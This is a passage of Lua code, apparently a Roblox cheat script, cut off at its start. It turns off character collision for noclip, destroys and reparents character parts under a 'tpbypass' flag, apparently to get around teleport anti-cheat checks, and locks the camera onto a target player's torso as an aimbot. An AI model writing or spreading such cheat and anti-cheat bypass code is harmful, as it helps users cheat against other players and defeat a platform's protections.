		pcall(function()
		game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
		game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
		game.Players.LocalPlayer.Character["Left Arm"].CanCollide = false
		game.Players.LocalPlayer.Character["Right Arm"].CanCollide = false
		game.Players.LocalPlayer.Character.Torso.CanCollide = false
		game.Players.LocalPlayer.Character.Head.CanCollide = false
		end)
		end
	pcall(function()
		game.Players.LocalPlayer.Character.Glock.Barrel.CanCollide = false
	end)
	if invis == true  then

	else
		if tpbypass == true then

			pcall(function()
				local client = game:GetService("Players").LocalPlayer;
				local lighting = game:GetService("Lighting");

				client.Character:FindFirstChild("HumanoidRootPart"):Destroy();
				client.Character:FindFirstChildWhichIsA("Humanoid").Parent = lighting;
				lighting:FindFirstChildWhichIsA("Humanoid").Parent = client.Character;

			end)
		end
	end

	if camsettings.locking == true then
		pcall(function() -- i love pcall
			if game.Players[camsettings.locktarget.Name] ~= nil then

				game.Workspace.Camera.CFrame = CFrame.new(game.Workspace.Camera.CFrame.p, game.Players[camsettings.locktarget.Name].Character:FindFirstChild("Torso").CFrame.p)

			end
		end)
	else
	end
	pcall(function() -- heskjjksdaadkjdsjkasdjksa
		if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
			if invis == true then
				invis = false
			else

			end
		end
	end)
end)

